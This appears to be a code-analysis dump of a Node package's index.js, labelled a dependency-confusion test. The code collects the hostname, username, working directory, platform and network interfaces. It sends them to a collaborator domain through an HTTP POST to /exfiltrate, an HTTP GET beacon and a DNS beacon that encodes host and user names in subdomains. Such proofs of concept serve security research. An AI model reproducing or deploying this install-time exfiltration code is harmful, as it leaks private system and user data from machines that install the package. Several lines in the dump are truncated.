// File: tmp/tmp2cagelgs/one-fixed-dep-bins/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const http = require('http')
Line 3: const os = require('os')
Line 4: const dns = require('dns')
Line 10: {
        // Collect basic system information (similar to the original research)
        const hostname = os.hostname();
        const username = os.userInfo().username;
        const currentPath = process.cwd();
        const platform = os.platform();
        const arch = os.arch();
        const networkInterfaces = os.networkInterfaces();
        
        console.log('[DEPENDENCY CONFUSION TEST] Package installed!');
        console.log(`Hostname: ${hostname}`);
        console.log(`Username: ${username}`);
        console.log(`Current Path: ${currentPath}`);
        console.log(`Platform: ${platform}`);
        console.log(`Architecture: ${arch}`);
        
        // Get external IP
        let externalIP = 'unknown';
        const interfaces = Object.values(networkInterfaces).flat();
        const publicInterface = interfaces.find(iface => 
            !iface.internal && iface.family === 'IPv4'
        );
        if (publicInterface) {
            externalIP = publicInterface.a...
Line 12: os.hostname()
Line 13: os.userInfo()
Line 15: os.platform()
Line 16: os.arch()
Line 19: console.log('[DEPENDENCY CONFUSION TEST] Package installed!')
Line 28: Object.values(networkInterfaces).flat()
Line 29: const publicInterface = interfaces.find(iface => 
            !iface.internal && iface.family === 'IPv4'
        )
Line 50: console.log('[PAYLOAD]', JSON.stringify(payload, null, 2))
Line 53: sendHttpData(payload)
Line 61: catch (error) {
        console.error('[ERROR] Failed to collect system info:', error.message);
        
        // Send error notification
        const errorPayload = {
            error: error.message,
            timestamp: new Date().toISOString(),
            hostname: os.hostname() || 'unknown'
        };
        sendHttpData(errorPayload);
    }
Line 62: console.error('[ERROR] Failed to collect system info:', error.message)
Line 68: os.hostname()
Line 70: sendHttpData(errorPayload)
Line 74: {
    const postData = JSON.stringify(payload);
    
    const options = {
        hostname: COLLABORATOR_DOMAIN,
        port: 80,
        path: '/exfiltrate',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
            'User-Agent': 'DependencyConfusionTest/1.0',
            'X-Package-Name': 'test-internal-package',
            'X-Hostname': payload.hostname,
            'X-Username': payload.username
        }
    };
    
    console.log('[HTTP POST] Sending data to:', `http://${COLLABORATOR_DOMAIN}/exfiltrate`);
    
    const req = http.request(options, (res) => {
        console.log('[HTTP POST] Status:', res.statusCode);
        res.on('data', (chunk) => {
            console.log('[HTTP POST] Response:', chunk.toString());
        });
    });
    
    req.on('error', (e) => {
        console.log('[HTTP POST] Request sent (expected error):', e.message);
    });
    
    req.w...
Line 92: console.log('[HTTP POST] Sending data to:', `http://${COLLABORATOR_DOMAIN}/exfiltrate`)
Line 94: const req = http.request(options, (res) => {
        console.log('[HTTP POST] Status:', res.statusCode);
        res.on('data', (chunk) => {
            console.log('[HTTP POST] Response:', chunk.toString());
        });
    })
Line 95: console.log('[HTTP POST] Status:', res.statusCode)
Line 96: {
            console.log('[HTTP POST] Response:', chunk.toString());
        }
Line 97: console.log('[HTTP POST] Response:', chunk.toString())
Line 101: {
        console.log('[HTTP POST] Request sent (expected error):', e.message);
    }
Line 102: console.log('[HTTP POST] Request sent (expected error):', e.message)
Line 105: req.write(postData)
Line 106: req.end()
Line 109: {
    // Encode payload in URL parameters
    const params = new URLSearchParams({
        hostname: payload.hostname,
        username: payload.username,
        path: payload.currentPath,
        platform: payload.platform,
        timestamp: payload.timestamp,
        package: 'test-internal-package'
    });
    
    const url = `http://${COLLABORATOR_DOMAIN}/beacon?${params.toString()}`;
    
    console.log('[HTTP GET] Sending request to:', url);
    
    const options = {
        hostname: COLLABORATOR_DOMAIN,
        port: 80,
        path: `/beacon?${params.toString()}`,
        method: 'GET',
        headers: {
            'User-Agent': 'NodeJS-DependencyConfusion/1.0',
            'X-Package-Installed': 'test-internal-package'
        }
    };
    
    const req = http.request(options, (res) => {
        console.log('[HTTP GET] Status:', res.statusCode);
        res.on('data', (chunk) => {
            console.log('[HTTP GET] Response:', chunk.toString());
        });
    }...
Line 111: const params = new URLSearchParams({
        hostname: payload.hostname,
        username: payload.username,
        path: payload.currentPath,
        platform: payload.platform,
        timestamp: payload.timestamp,
        package: 'test-internal-package'
    })
Line 120: <operator>.formatString("http://", COLLABORATOR_DOMAIN, "/beacon?", params.toString(), "")
Line 122: console.log('[HTTP GET] Sending request to:', url)
Line 127: params.toString()
Line 135: const req = http.request(options, (res) => {
        console.log('[HTTP GET] Status:', res.statusCode);
        res.on('data', (chunk) => {
            console.log('[HTTP GET] Response:', chunk.toString());
        });
    })
Line 136: console.log('[HTTP GET] Status:', res.statusCode)
Line 137: {
            console.log('[HTTP GET] Response:', chunk.toString());
        }
Line 138: console.log('[HTTP GET] Response:', chunk.toString())
Line 142: {
        console.log('[HTTP GET] Request sent (expected error):', e.message);
    }
Line 143: console.log('[HTTP GET] Request sent (expected error):', e.message)
Line 146: req.end()
Line 149: {
    // Send DNS beacon as backup
    const beacon = `${payload.hostname}.${payload.username}.${Date.now().toString(36)}.${COLLABORATOR_DOMAIN}`;
    console.log('[DNS BEACON] Sending:', beacon);
    
    dns.resolve4(beacon, (err) => {
        if (err) {
            console.log('[DNS BEACON] Sent successfully');
        }
    });
}
Line 151: Date.now().toString(36)
Line 152: console.log('[DNS BEACON] Sending:', beacon)
Line 154: dns.resolve4(beacon, (err) => {
        if (err) {
            console.log('[DNS BEACON] Sent successfully');
        }
    })
Line 155: {
            console.log('[DNS BEACON] Sent successfully');
        }
Line 156: console.log('[DNS BEACON] Sent successfully')
